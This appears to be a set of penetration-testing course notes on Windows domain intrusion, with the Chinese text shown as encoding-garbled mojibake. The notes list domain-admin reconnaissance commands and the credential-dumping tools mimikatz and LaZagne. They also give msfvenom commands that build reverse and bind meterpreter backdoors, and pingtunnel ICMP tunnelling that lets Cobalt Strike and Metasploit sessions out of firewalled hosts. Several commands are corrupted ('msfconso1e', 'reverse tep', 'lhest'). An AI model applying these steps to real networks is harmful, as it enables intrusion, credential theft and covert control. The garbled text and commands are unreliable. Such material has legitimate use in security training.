<p>å› æ­¤ï¼ŒåŸŸæ¸—é€çš„æ€è·¯å°±æ˜¯ï¼šé€šè¿‡åŸŸæˆå‘˜ä¸»æœºï¼Œå®šä½å‡ºåŸŸæ§åˆ¶å™¨ IP åŠåŸŸç®¡ç†å‘˜è´¦å·ï¼Œåˆ©ç”¨</p>
<p>åŸŸæˆå‘˜ä¸»æœºä½œä¸ºè·³æ¿ï¼Œæ‰©å¤§æ¸—é€èŒƒå›´ï¼Œåˆ©ç”¨åŸŸç®¡ç†å‘˜å¯ä»¥ç™»é™†åŸŸä¸­ä»»ä½•æˆå‘˜ä¸»æœºçš„ç‰¹æ€§ï¼Œ</p>
<p>å®šä½å‡ºåŸŸç®¡ç†å‘˜ç™»é™†è¿‡çš„ä¸»æœº IPï¼Œè®¾æ³•ä»åŸŸæˆå‘˜ä¸»æœºå†…å­˜ä¸­ dump å‡ºåŸŸç®¡ç†å‘˜å¯†ç ï¼Œè¿›</p>
<p>è€Œæ‹¿ä¸‹åŸŸæ§åˆ¶å™¨ã€æ¸—é€æ•´ä¸ªå†…ç½‘ã€‚</p>
<p>â€“å½“å‰æœºå™¨è§’è‰²çš„åˆ¤æ–­</p>
<p>â€“å½“å‰æœºå™¨ç½‘ç»œç¯å¢ƒåˆ¤æ–­</p>
<p>â€“å½“å‰æœºå™¨è§’è‰²åŠŸèƒ½åˆ¤æ–­</p>
<p>ç½‘ç»œç¯å¢ƒ-å±€åŸŸç½‘&amp;å·¥ä½œç»„&amp;åŸŸç¯å¢ƒ</p>
<p>æœºå™¨è§’è‰²-ä¸ªäºº PC&amp;æ–‡ä»¶æœåŠ¡å™¨&amp;é‚®ä»¶æœåŠ¡å™¨ç­‰</p>
<p>è§’è‰²åŠŸèƒ½-ä»»åŠ¡&amp;ç«¯å£&amp;æœåŠ¡&amp;å¯†ç &amp;æ¼æ´&amp;é…ç½®ç­‰</p>
<p>ç½‘ç»œç¯å¢ƒ-å±€åŸŸç½‘-å·¥ä½œç»„&amp;åŸŸç¯å¢ƒ</p>
<p>æœºå™¨è§’è‰²-ä¸ªäººPC&amp;æ–‡ä»¶æœåŠ¡å™¨&amp;é‚®ä»¶æœåŠ¡å™¨ç­‰</p>
<p>è§’è‰²åŠŸèƒ½-ä»»åŠ¡&amp;ç«¯å£&amp;æœåŠ¡&amp;å¯†ç &amp;æ¼æ´&amp;é…ç½®ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-51"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-51" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ å¸¸è§„ä¿¡æ¯ç±»æ”¶é›†-åº”ç”¨&amp;æœåŠ¡&amp;æƒé™ç­‰</p>
<p>ïƒ˜ æ¶æ„ä¿¡æ¯ç±»æ”¶é›†-ç½‘ç»œ&amp;ç”¨æˆ·&amp;åŸŸæ§ç­‰</p>
<p>ïƒ˜ å…³é”®ä¿¡æ¯ç±»æ”¶é›†-å¯†ç &amp;å‡­æ®&amp;å£ä»¤ç­‰</p>
<p>ïƒ˜ è‡ªåŠ¨åŒ–å·¥å…·æ¢é’ˆ-æ’ä»¶&amp;Adfind&amp;BloodHound</p>
<p>#å¸¸è§„ä¿¡æ¯ç±»æ”¶é›†-åº”ç”¨&amp;æœåŠ¡&amp;æƒé™ç­‰</p>
<p>æ›´å¤šå…¶ä»–æ”¶é›†è§ä¸Šå›¾å‘½ä»¤è¡¨</p>
<p>systeminfo è¯¦ç»†ä¿¡æ¯</p>
<p>netstat -ano ç«¯å£åˆ—è¡¨</p>
<p>route print è·¯ç”±è¡¨</p>
<p>net start å¯åŠ¨æœåŠ¡</p>
<p>tasklist è¿›ç¨‹åˆ—è¡¨</p>
<p>schtasks è®¡åˆ’ä»»åŠ¡</p>
<p>ipconfig &#x2F;all åˆ¤æ–­å­˜åœ¨åŸŸ</p>
<p>net view &#x2F;domain åˆ¤æ–­å­˜åœ¨åŸŸ</p>
<p>net time &#x2F;domain åˆ¤æ–­ä¸»åŸŸ</p>
<p>netstat -ano å½“å‰ç½‘ç»œç«¯å£å¼€æ”¾</p>
<p>nslookup åŸŸå è¿½è¸ªæ¥æºåœ°å€</p>
<p>wmic service list brief æŸ¥è¯¢æœ¬æœºæœåŠ¡</p>
<p>net config workstation æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯</p>
<p>wmic startup get command,caption æŸ¥çœ‹å·²å¯åŠ¨çš„ç¨‹åºä¿¡æ¯</p>
<p>#æ¶æ„ä¿¡æ¯ç±»æ”¶é›†-ç½‘ç»œ&amp;ç”¨æˆ·&amp;åŸŸæ§ç­‰</p>
<p>net view &#x2F;domain æŸ¥è¯¢åŸŸåˆ—è¡¨</p>
<p>net time&#x2F;domain ä»åŸŸæ§æŸ¥è¯¢æ—¶é—´ï¼Œè‹¥å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·ä¼šä»åŸŸæ§è¿”å›å½“å‰æ—¶é—´ï¼Œäº¦</p>
<p>ç”¨æ¥åˆ¤ æ–­ä¸»åŸŸï¼Œä¸»åŸŸä¸€èˆ¬ç”¨åšæ—¶é—´æœåŠ¡å™¨</p>
<p>net localgroup administrators æœ¬æœºç®¡ç†å‘˜ã€é€šå¸¸å«æœ‰åŸŸç”¨æˆ·ã€‘</p>
<p>net user &#x2F;domain æŸ¥è¯¢åŸŸç”¨æˆ·(å½“å‰åŸŸ)</p>
<p>net group &#x2F;domain æŸ¥è¯¢åŸŸå·¥ä½œç»„</p>
<p>net group â€œdomain computersâ€ &#x2F;domain æŸ¥çœ‹åŠ å…¥åŸŸçš„æ‰€æœ‰è®¡ç®—æœºå</p>
<p>net group â€œdomain adminsâ€ &#x2F;domain æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„å’ŒåŸŸç®¡ç”¨æˆ·</p>
<p>net localgroup administrators &#x2F;domain æŸ¥çœ‹åŸŸç®¡ç†å‘˜</p>
<p>net group â€œdomain controllersâ€ &#x2F;domain æŸ¥çœ‹åŸŸæ§</p>
<p>net accounts &#x2F;domain æŸ¥çœ‹åŸŸå¯†ç ç­–ç•¥</p>
<p>#å…³é”®ä¿¡æ¯ç±»æ”¶é›†-å¯†ç &amp;å‡­æ®&amp;å£ä»¤ç­‰</p>
<p>æ—¨åœ¨æ”¶é›†å„ç§å¯†æ–‡ï¼Œæ˜æ–‡ï¼Œå£ä»¤ç­‰ï¼Œä¸ºåç»­æ¨ªå‘æ¸—é€åšå¥½æµ‹è¯•å‡†å¤‡</p>
<p>è®¡ç®—æœºç”¨æˆ· HASHï¼Œæ˜æ–‡è·å–-mimikatz(win)ï¼Œmimipenguin(linux)</p>
<p>è®¡ç®—æœºå„ç§åè®®æœåŠ¡å£ä»¤è·å–-LaZagne(all)ï¼ŒXenArmor(win)ï¼ŒCS æ’ä»¶</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p>
<p><a href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a></p>
<p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
<p><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></p>
<p>ä¸»è¦ä»‹ç»ä¸€ä¸‹åŸŸæ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆç”¨ï¼Œæ€ä¹ˆå»åˆ©ç”¨</p>
<h1 id="ç¬¬123å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸé˜²ç«å¢™-å…¥ç«™å‡ºç«™è§„åˆ™-ä¸å‡ºç½‘éš§é“ä¸Šçº¿-ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥"><a href="#ç¬¬123å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸé˜²ç«å¢™-å…¥ç«™å‡ºç«™è§„åˆ™-ä¸å‡ºç½‘éš§é“ä¸Šçº¿-ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥" class="headerlink" title="ç¬¬123å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸé˜²ç«å¢™&amp;å…¥ç«™å‡ºç«™è§„åˆ™&amp;ä¸å‡ºç½‘éš§é“ä¸Šçº¿&amp;ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥"></a>ç¬¬123å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸé˜²ç«å¢™&amp;å…¥ç«™å‡ºç«™è§„åˆ™&amp;ä¸å‡ºç½‘éš§é“ä¸Šçº¿&amp;ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-57"><a href="#çŸ¥è¯†ç‚¹ï¼š-57" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>0ã€é˜²ç«å¢™ç»„ç­–ç•¥å¯¹è±¡         å…¥è§„åˆ™ä¸¥æ ¼ï¼Œå‡ºè§„åˆ™å®½æ¾</p>
<p>1ã€OSI ä¸ƒå±‚åè®®æ¨¡å‹</p>
<p>2ã€æ­£åå‘ç›‘å¬å™¨è¯´æ˜        æˆ‘å»è¿æ¥ä½ ä¸ºæ­£å‘</p>
<p>3ã€éš§é“æŠ€æœ¯åˆ†å±‚åè®®</p>
<p>4ã€CS&amp;MSF&amp;æ§åˆ¶ä¸Šçº¿</p>
<p>-éš§é“æŠ€æœ¯ï¼šè§£å†³ä¸å‡ºç½‘åè®®ä¸Šçº¿çš„é—®é¢˜ï¼ˆåˆ©ç”¨å‡ºç½‘åè®®è¿›è¡Œå°è£…å‡ºç½‘ï¼‰</p>
<p>æˆ‘ä¸ªäººä½¿ç”¨çš„æ˜¯stowawayï¼Œè¿™é‡Œå·¥å…·æœ‰å¾ˆå¤šï¼Œè‡ªå·±é€‰æ‹©å³å¯</p>
<p>-ä»£ç†æŠ€æœ¯ï¼šè§£å†³ç½‘ç»œé€šè®¯ä¸é€šçš„é—®é¢˜ï¼ˆåˆ©ç”¨è·³æ¿æœºå»ºç«‹èŠ‚ç‚¹åç»­æ“ä½œï¼‰</p>
<h4 id="ç³»åˆ—ç‚¹ï¼š"><a href="#ç³»åˆ—ç‚¹ï¼š" class="headerlink" title="#ç³»åˆ—ç‚¹ï¼š"></a>#ç³»åˆ—ç‚¹ï¼š</h4><p>1ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨ä»£ç†</p>
<p>2ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨éš§é“</p>
<p>3ã€åˆ¤æ–­å‡ºç½‘å’Œä¸å‡ºç½‘åè®®</p>
<p>4ã€å¦‚ä½•ä½¿ç”¨ä»£ç†å»ºç«‹èŠ‚ç‚¹å¹¶è¿æ¥</p>
<p>5ã€å¦‚ä½•ä½¿ç”¨éš§é“æŠ€æœ¯å°è£…åè®®ä¸Šçº¿</p>
<p>6ã€åˆ¤æ–­å“ªäº›ä»£ç†æˆ–éš§é“æƒ…å†µé€‰æ‹©æ”¾å¼ƒ</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-52"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-52" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ å•æœº-é˜²ç«å¢™-é™åˆ¶ç«¯å£å‡ºå…¥ç«™</p>
<p>ïƒ˜ å•æœº-é˜²ç«å¢™-é™åˆ¶åè®®å‡ºå…¥ç«™</p>
<p>ïƒ˜ åŸŸæ§-é˜²ç«å¢™-ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥</p>
<p>ïƒ˜ åŸŸæ§-é˜²ç«å¢™-ç»„ç­–ç•¥ä¸å‡ºç½‘ä¸Šçº¿</p>
<h4 id="å•æœº-é˜²ç«å¢™-é™åˆ¶ç«¯å£å‡ºå…¥ç«™"><a href="#å•æœº-é˜²ç«å¢™-é™åˆ¶ç«¯å£å‡ºå…¥ç«™" class="headerlink" title="#å•æœº-é˜²ç«å¢™-é™åˆ¶ç«¯å£å‡ºå…¥ç«™"></a>#å•æœº-é˜²ç«å¢™-é™åˆ¶ç«¯å£å‡ºå…¥ç«™</h4><p>ç†Ÿæ‚‰å¸¸è§ä¸»æœºé…ç½®ä¸å‡ºç½‘çš„æ–¹å¼</p>
<p>1ã€å…¥ç«™&amp;å‡ºç«™&amp;è¿æ¥å®‰å…¨</p>
<p>2ã€åŸŸ&amp;ä¸“ç”¨&amp;å…¬ç½‘&amp;çŠ¶æ€</p>
<p>3ã€é˜»æ­¢&amp;å…è®¸&amp;å…¶ä»–é…ç½®</p>
<h4 id="å•æœº-é˜²ç«å¢™-é™åˆ¶åè®®å‡ºå…¥ç«™"><a href="#å•æœº-é˜²ç«å¢™-é™åˆ¶åè®®å‡ºå…¥ç«™" class="headerlink" title="#å•æœº-é˜²ç«å¢™-é™åˆ¶åè®®å‡ºå…¥ç«™"></a>#å•æœº-é˜²ç«å¢™-é™åˆ¶åè®®å‡ºå…¥ç«™</h4><p>ç†Ÿæ‚‰å¸¸è§ä¸»æœºé…ç½®ä¸å‡ºç½‘çš„æ–¹å¼</p>
<p>1ã€ç¨‹åº&amp;ç«¯å£&amp;é¢„å®šä¹‰&amp;è‡ªå®šä¹‰</p>
<p>2ã€åè®®&amp;TCP&amp;UDP&amp;ICMP&amp;L2TP ç­‰</p>
<h4 id="åŸŸæ§-é˜²ç«å¢™-ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥"><a href="#åŸŸæ§-é˜²ç«å¢™-ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥" class="headerlink" title="#åŸŸæ§-é˜²ç«å¢™-ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥"></a>#åŸŸæ§-é˜²ç«å¢™-ç»„ç­–ç•¥å¯¹è±¡åŒæ­¥</h4><p>ç†Ÿæ‚‰å¸¸è§ä¸»æœºé…ç½®ä¸å‡ºç½‘çš„æ“ä½œæµç¨‹</p>
<p>æ“ä½œï¼šç»„ç­–ç•¥ç®¡ç†-åŸŸ-åˆ›å»º GPO é“¾æ¥-é˜²ç«å¢™è®¾ç½®</p>
<p>æ›´æ–°ç­–ç•¥ï¼šå¼ºåˆ¶&amp;å‘½ä»¤&amp;é‡å¯</p>
<p>å‘½ä»¤ï¼šgpupdate&#x2F;force</p>
<p>#åŸŸæ§-é˜²ç«å¢™-ç»„ç­–ç•¥ä¸å‡ºç½‘ä¸Šçº¿</p>
<p>èƒŒæ™¯ä»‹ç»ï¼šåŸŸæ§é€šè¿‡ç»„ç­–ç•¥è®¾ç½®é˜²ç«å¢™è§„åˆ™åŒæ­¥åï¼ŒåŸŸå†…ç”¨æˆ·ä¸»æœºè¢«é™åˆ¶ TCP å‡ºç½‘ï¼Œå…¶</p>
<p>ä¸­è§„åˆ™ä¸ºå‡ºç«™è§„åˆ™ï¼Œå®‰å…¨ç ”ç©¶è€…é€šè¿‡å…¥ç«™å–å¾— SHELL æƒé™ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œä¸Šçº¿æ§åˆ¶ã€‚</p>
<p>æ€è·¯ï¼šæ­£å‘è¿æ¥&amp;éš§é“æŠ€æœ¯</p>
<p>å¦‚æœæ˜¯å…¥ç«™è¢«é™åˆ¶å‘¢ï¼Ÿåå‘è¿æ¥&amp;éš§é“æŠ€æœ¯ä¹Ÿå¯ä»¥è§£å†³ï¼ˆå‰æçœ‹é™åˆ¶çš„å¤šä¸å¤šï¼‰</p>
<p>ICMP åè®®é¡¹ç›®ï¼š</p>
<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
<p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>1ã€CS-ICMP-ä¸Šçº¿</p>
<p>VPS:</p>
<p>.&#x2F;pingtunnel -type server</p>
<p>è‚‰é¸¡ï¼š(ç®¡ç†å™¨è¿è¡Œ)</p>
<p>pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t </p>
<p>192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1</p>
<p>CS:</p>
<p>ç›‘å¬å™¨ 1ï¼š127.0.0.1 6666</p>
<p>ç›‘å¬å™¨ 2ï¼š192.168.46.66 7777</p>
<p>ç”Ÿæˆç›‘å¬å™¨ 1 çš„ Stager åé—¨è‚‰é¸¡æ‰§è¡Œ</p>
<p>2ã€MSFä¸Šçº¿<br>ç”Ÿæˆåé—¨:<br>msfvenom p windows&#x2F;meterpreter&#x2F;reverse tcp HOST&#x3D;127.0.0.1<br>LPORT&#x3D;3333 -f exe &gt; xd.exe<br>MS&#x3D;å¯åŠ¨ç›‘å¬:<br>msfconso1e<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse tep<br>get lhest 0.0.0.0<br>set lport 4444<br>exploit<br>a11å¼€å¯éš§é“:<br>&#x2F;pingtunnel -type server</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/42d2d6e5485a227110735fafee311311--dfb4--image-20240511083406029.png" alt="image-20240511083406029"></p>
<h1 id="ç¬¬124å¤©ï¼šå†…ç½‘å®‰å…¨-ä»£ç†Socksåè®®-è·¯ç”±ä¸å‡ºç½‘-åæ¸—é€é€šè®¯-CS-MSFæ§åˆ¶ä¸Šçº¿"><a href="#ç¬¬124å¤©ï¼šå†…ç½‘å®‰å…¨-ä»£ç†Socksåè®®-è·¯ç”±ä¸å‡ºç½‘-åæ¸—é€é€šè®¯-CS-MSFæ§åˆ¶ä¸Šçº¿" class="headerlink" title="ç¬¬124å¤©ï¼šå†…ç½‘å®‰å…¨-ä»£ç†Socksåè®®&amp;è·¯ç”±ä¸å‡ºç½‘&amp;åæ¸—é€é€šè®¯&amp;CS-MSFæ§åˆ¶ä¸Šçº¿"></a>ç¬¬124å¤©ï¼šå†…ç½‘å®‰å…¨-ä»£ç†Socksåè®®&amp;è·¯ç”±ä¸å‡ºç½‘&amp;åæ¸—é€é€šè®¯&amp;CS-MSFæ§åˆ¶ä¸Šçº¿</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-58"><a href="#çŸ¥è¯†ç‚¹ï¼š-58" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€ä»£ç†è½¯ä»¶ä½¿ç”¨-Win&amp;Linux</p>
<p>2ã€ä»£ç†åè®®ä½¿ç”¨-Socks4&#x2F;5</p>
<p>3ã€CS&amp;MSF-ç½‘ç»œé€šè®¯&amp;æ§åˆ¶ä¸Šçº¿</p>
<p>-éš§é“æŠ€æœ¯ï¼šè§£å†³ä¸å‡ºç½‘åè®®ä¸Šçº¿çš„é—®é¢˜ï¼ˆåˆ©ç”¨å‡ºç½‘åè®®è¿›è¡Œå°è£…å‡ºç½‘ï¼‰</p>
<p>-ä»£ç†æŠ€æœ¯ï¼šè§£å†³ç½‘ç»œé€šè®¯ä¸é€šçš„é—®é¢˜ï¼ˆåˆ©ç”¨è·³æ¿æœºå»ºç«‹èŠ‚ç‚¹åç»­æ“ä½œï¼‰</p>
<p>-è¿æ¥æ–¹å‘ï¼šæ­£å‘&amp;åå‘ï¼ˆåŸºç¡€è¯¾ç¨‹æœ‰è®²è¿‡ï¼‰</p>
<h4 id="ç³»åˆ—ç‚¹ï¼š-1"><a href="#ç³»åˆ—ç‚¹ï¼š-1" class="headerlink" title="#ç³»åˆ—ç‚¹ï¼š"></a>#ç³»åˆ—ç‚¹ï¼š</h4><p>1ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨ä»£ç†         </p>
<p>2ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨éš§é“</p>
<p>3ã€åˆ¤æ–­å‡ºç½‘å’Œä¸å‡ºç½‘åè®®</p>
<p>4ã€å¦‚ä½•ä½¿ç”¨ä»£ç†å»ºç«‹èŠ‚ç‚¹å¹¶è¿æ¥</p>
<p>5ã€å¦‚ä½•ä½¿ç”¨éš§é“æŠ€æœ¯å°è£…åè®®ä¸Šçº¿</p>
<p>6ã€åˆ¤æ–­å“ªäº›ä»£ç†æˆ–éš§é“æƒ…å†µé€‰æ‹©æ”¾å¼ƒ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/67e4aaa79b879330b771633d8535143b--cf65--image-20240511083808897.png" alt="image-20240511083808897"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/6344854276615d72961db5c984fa1edc--d69d--image-20240511084449143.png" alt="image-20240511084449143"></p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-53"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-53" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ ç½‘ç»œé€šè®¯-MSF&amp;CS-è·¯ç”±æ·»åŠ &amp;èŠ‚ç‚¹å»ºç«‹</p>
<p>ïƒ˜ æ§åˆ¶ä¸Šçº¿-MSF&amp;CS-åè®®ç”Ÿæˆ&amp;æ­£åè¿æ¥</p>
<h4 id="ç½‘ç»œé€šè®¯-MSF-CS-è·¯ç”±æ·»åŠ -èŠ‚ç‚¹å»ºç«‹"><a href="#ç½‘ç»œé€šè®¯-MSF-CS-è·¯ç”±æ·»åŠ -èŠ‚ç‚¹å»ºç«‹" class="headerlink" title="#ç½‘ç»œé€šè®¯-MSF&amp;CS-è·¯ç”±æ·»åŠ &amp;èŠ‚ç‚¹å»ºç«‹"></a>#ç½‘ç»œé€šè®¯-MSF&amp;CS-è·¯ç”±æ·»åŠ &amp;èŠ‚ç‚¹å»ºç«‹</h4><h4 id="æ§åˆ¶ä¸Šçº¿-MSF-CS-åè®®ç”Ÿæˆ-æ­£åè¿æ¥"><a href="#æ§åˆ¶ä¸Šçº¿-MSF-CS-åè®®ç”Ÿæˆ-æ­£åè¿æ¥" class="headerlink" title="#æ§åˆ¶ä¸Šçº¿-MSF&amp;CS-åè®®ç”Ÿæˆ&amp;æ­£åè¿æ¥"></a>#æ§åˆ¶ä¸Šçº¿-MSF&amp;CS-åè®®ç”Ÿæˆ&amp;æ­£åè¿æ¥</h4><p>ä»£ç†åè®®ï¼š</p>
<p>SOCKS4&#x2F;5</p>
<p>ä»£ç†è½¯ä»¶ï¼š</p>
<p>SocksCap Proxifier ProxyChains ç­‰</p>
<p>MSF é€šè®¯</p>
<p>1ã€æ·»åŠ è·¯ç”± é™äº MSF</p>
<p>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</p>
<p>run autoroute -p</p>
<p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p>
<p>æ·»åŠ æŒ‡å®šè·¯ç”±ï¼Œ1 æ˜¯æ¥æ”¶çš„ session ç¼–å·</p>
<p>route add 192.168.11.0 255.255.255.0 1</p>
<p>2ã€Sock ä»£ç† å…¨å±€åŒç”¨</p>
<p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>
<p>set srvhost 0.0.0.0</p>
<p>set srvport 1115</p>
<p>run</p>
<p>å¯ç”¨ä»£ç†è½¯ä»¶é…ç½® Sock5 ä»£ç†</p>
<p>CS é€šè®¯</p>
<p>å‘½ä»¤ï¼šsocks 59578</p>
<p>æ“ä½œï¼šä»£ç†è½¬å‘-Socks ä»£ç†</p>
<p>MSF æ§åˆ¶ä¸Šçº¿-æ­£å‘è¿æ¥</p>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;3333 </p>
<p>-f exe &gt; bd.exe</p>
<p>use exploit&#x2F;multi&#x2F;handler</p>
<p>set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p>
<p>set rhost 192.168.11.129</p>
<p>set lport 3333</p>
<p>run</p>
<p>CS æ§åˆ¶ä¸Šçº¿-æ­£å‘è¿æ¥</p>
<p>ç›‘å¬å™¨ï¼šbind_tcp port</p>
<p>å‘½ä»¤ï¼šconnect ip port</p>
<p>å®éªŒ 2ï¼šäºŒå±‚ï¼ˆåç»­å¤šå±‚æ“ä½œä¸€è‡´ï¼‰</p>
<p>ä»£ç†è½¯ä»¶çŠ–é•«æ¾Œ<br>Sockscap Proxifier Proxychainsç­‰</p>
<p>MSFé€šè®¯<br>1ã€æ·»åŠ è·¯ç”± é™äºMSF<br>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯<br>run autoroute -p<br>run post&#x2F;multi&#x2F;manage&#x2F;autorcute<br>æ·»åŠ æŒ‡å®šè·¯ç”±ï¼Œ1æ˜¯æ¥æ”¶çš„sessionç¼–å·<br>route add 192.168 11.0 255.255.255.0 1<br>2ã€sockä»£ç† å…¨å±€åŒç”¨<br>use auxiliary&#x2F;server&#x2F;socks_proxy<br>set srvhost 0.0.0.0<br>set srvport 1115<br>run<br>å¯ç”¨ä»£ç†è½¯ä»¶é…ç½®Socks5ä»£ç†<br>csé€šè®¯<br>å‘½ä»¤:Socks5 59578<br>æ“ä½œ:ä»£ç†è½¬å‘-Socksä»£ç†<br>MSEæ§åˆ¶ä¸Šçº¿-æ­£å‘è¿æ¥<br>msfvenom p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 PORT&#x3D;3333</p>
<p>-f exe &gt; bd.exe<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set rhost 192.168.11.129<br>set lport 3333<br>run<br>csæ§åˆ¶ä¸Šçº¿-æ­£å‘è¿æ¥<br>ç›‘å¬å™¨:bind tcp port<br>å‘½ä»¤:connect ip port</p>
<h1 id="ç¬¬125å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯-SMB-ICMP-æ­£åå‘è¿æ¥-é˜²ç«å¢™å‡ºå…¥è§„åˆ™ä¸Šçº¿"><a href="#ç¬¬125å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯-SMB-ICMP-æ­£åå‘è¿æ¥-é˜²ç«å¢™å‡ºå…¥è§„åˆ™ä¸Šçº¿" class="headerlink" title="ç¬¬125å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯&amp;SMB&amp;ICMP&amp;æ­£åå‘è¿æ¥&amp;é˜²ç«å¢™å‡ºå…¥è§„åˆ™ä¸Šçº¿"></a>ç¬¬125å¤©ï¼šå†…ç½‘å®‰å…¨-éš§é“æŠ€æœ¯&amp;SMB&amp;ICMP&amp;æ­£åå‘è¿æ¥&amp;é˜²ç«å¢™å‡ºå…¥è§„åˆ™ä¸Šçº¿</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-59"><a href="#çŸ¥è¯†ç‚¹ï¼š-59" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€å…¥ç«™è§„åˆ™ä¸å‡ºç½‘ä¸Šçº¿æ–¹æ¡ˆ</p>
<p>2ã€å‡ºç«™è§„åˆ™ä¸å‡ºç½‘ä¸Šçº¿æ–¹æ¡ˆ</p>
<p>3ã€è§„åˆ™-éš§é“æŠ€æœ¯-SMB&amp;ICMP</p>
<p>-éš§é“æŠ€æœ¯ï¼šè§£å†³ä¸å‡ºç½‘åè®®ä¸Šçº¿çš„é—®é¢˜ï¼ˆåˆ©ç”¨å‡ºç½‘åè®®è¿›è¡Œå°è£…å‡ºç½‘ï¼‰</p>
<p>-ä»£ç†æŠ€æœ¯ï¼šè§£å†³ç½‘ç»œé€šè®¯ä¸é€šçš„é—®é¢˜ï¼ˆåˆ©ç”¨è·³æ¿æœºå»ºç«‹èŠ‚ç‚¹åç»­æ“ä½œï¼‰</p>
<p>-è¿æ¥æ–¹å‘ï¼šæ­£å‘&amp;åå‘ï¼ˆåŸºç¡€è¯¾ç¨‹æœ‰è®²è¿‡ï¼‰</p>
<h4 id="ç³»åˆ—ç‚¹ï¼š-2"><a href="#ç³»åˆ—ç‚¹ï¼š-2" class="headerlink" title="#ç³»åˆ—ç‚¹ï¼š"></a>#ç³»åˆ—ç‚¹ï¼š</h4><p>1ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨ä»£ç†</p>
<p>2ã€åˆ¤æ–­ä»€ä¹ˆæ—¶å€™ç”¨éš§é“</p>
<p>3ã€åˆ¤æ–­å‡ºç½‘å’Œä¸å‡ºç½‘åè®®</p>
<p>4ã€å¦‚ä½•ä½¿ç”¨ä»£ç†å»ºç«‹èŠ‚ç‚¹å¹¶è¿æ¥</p>
<p>5ã€å¦‚ä½•ä½¿ç”¨éš§é“æŠ€æœ¯å°è£…åè®®ä¸Šçº¿</p>
<p>6ã€åˆ¤æ–­å“ªäº›ä»£ç†æˆ–éš§é“æƒ…å†µé€‰æ‹©æ”¾å¼ƒ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/dd504fe86d60d41e5d808e194e458ce4--d9ee--image-20240511090624508.png" alt="image-20240511090624508"></p>
